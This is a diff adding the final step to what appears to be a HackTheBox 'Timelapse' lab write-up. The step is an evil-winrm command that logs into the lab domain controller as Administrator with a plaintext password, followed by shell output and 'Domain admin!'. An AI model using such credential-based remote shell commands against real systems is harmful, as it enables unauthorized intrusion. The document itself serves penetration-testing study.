@@ -398,5 +398,14 @@ SMB         10.129.227.113  445    DC01             [+] timelapse.htb\Administra
 As seen here the administrator is compromised
 
 ```python
-
+# evil-winrm -i dc01.timelapse.htb -u Administrator -p 'mL.Fe-Iu!iIm[}h(&)/LT650' -S
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
+Domain admin!
+
